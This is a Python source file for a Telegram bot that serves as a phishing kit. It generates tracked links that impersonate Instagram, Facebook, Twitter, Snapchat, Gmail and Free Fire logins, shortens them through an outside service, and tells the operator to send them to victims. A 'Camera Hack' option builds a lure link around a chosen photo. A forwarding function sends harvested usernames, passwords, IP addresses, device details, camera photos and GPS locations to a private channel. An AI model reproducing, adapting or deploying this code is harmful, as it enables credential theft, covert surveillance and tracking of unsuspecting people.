import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import uuid
import time
from config import *

bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}

def generate_phishing_link(victim_id, target_type):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={victim_id}"
    if SHORTENER_API:
        try:
            resp = requests.post("https://short-link.me/api", 
                                json={"url": link, "api": SHORTENER_API}, timeout=5)
            if resp.status_code == 200:
                short = resp.json().get("shortened_url")
                if short:
                    return short
        except:
            pass
    return link

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("📸 Camera Hack", callback_data="cam")
    btn2 = InlineKeyboardButton("📱 Social Media", callback_data="social")
    btn3 = InlineKeyboardButton("📧 Gmail", callback_data="gmail")
    btn4 = InlineKeyboardButton("🎮 Free Fire", callback_data="ff")
    btn5 = InlineKeyboardButton("🔗 Get All Links", callback_data="all")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    bot.send_message(user_id, "🔥 *Choose your weapon:*\n\n📸 Camera Hack\n📱 Social Media\n📧 Gmail\n🎮 Free Fire\n🔗 All Links", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    data = call.data
    if data == "cam":
        msg = bot.send_message(user_id, "📤 Send me a photo (for victim)\n📤 Then send redirect link (URL)")
        bot.register_next_step_handler(msg, get_photo_and_link, user_id, "cam")
    elif data == "social":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("Instagram", callback_data="ig"),
            InlineKeyboardButton("Facebook", callback_data="fb"),
            InlineKeyboardButton("Twitter", callback_data="tw"),
            InlineKeyboardButton("Snapchat", callback_data="sc"),
            InlineKeyboardButton("⬅ Back", callback_data="back")
        )
        bot.edit_message_text("Choose platform:", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup)
    elif data in ["ig", "fb", "tw", "sc", "gmail", "ff"]:
        link = generate_phishing_link(str(user_id), data)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
            InlineKeyboardButton("⬅ Back", callback_data="social" if data in ["ig","fb","tw","sc"] else "start")
        )
        platform_name = data.upper()
        if data == "gmail": platform_name = "GMAIL"
        elif data == "ff": platform_name = "FREE FIRE"
        bot.edit_message_text(f"✅ *{platform_name} phishing link ready:*\n\n`{link}`\n\nSend this to victim.", chat_id=user_id, message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    elif data == "all":
        links = {}
        for t in ["cam", "ig", "fb", "tw", "sc", "gmail", "ff"]:
            links[t] = generate_phishing_link(str(user_id), t)
        text = "```\n" + "\n".join([f"{k.upper()}: {v}" for k,v in links.items()]) + "\n```"
        bot.send_message(user_id, text, parse_mode="Markdown")
    elif data == "back":
        start(call.message)
    elif data.startswith("copy_"):
        bot.answer_callback_query(call.id, "✅ Link copied!")

def get_photo_and_link(message, user_id, target_type):
    if message.photo:
        photo_id = message.photo[-1].file_id
        if user_id not in user_sessions: user_sessions[user_id] = {}
        user_sessions[user_id]["photo"] = photo_id
        bot.send_message(user_id, "Now send redirect link (URL)")
        bot.register_next_step_handler(message, get_redirect_link, user_id, target_type)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.")
        start(message)

def get_redirect_link(message, user_id, target_type):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        if user_id not in user_sessions: user_sessions[user_id] = {}
        user_sessions[user_id]["redirect"] = redirect_url
        link = generate_phishing_link(str(user_id), "cam")
        bot.send_message(user_id, f"✅ Camera link ready:\n\n`{link}`\n\nVictim will see your photo & redirect.", parse_mode="Markdown")
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://")
        get_photo_and_link(message, user_id, target_type)

def forward_to_channel(data):
    try:
        text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        device = data.get('device_info', {})
        if device:
            text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        creds = data.get('creds')
        if creds:
            text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"
        bot.send_message(PRIVATE_CHANNEL_ID, text, parse_mode="Markdown")
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp.jpg', 'wb') as f: f.write(base64.b64decode(photo_base64))
                with open('temp.jpg', 'rb') as f: bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp.jpg')
            except: pass
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
    except Exception as e:
        print(f"Forward error: {e}")

if __name__ == "__main__":
    print("🤖 Bot is running...")
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
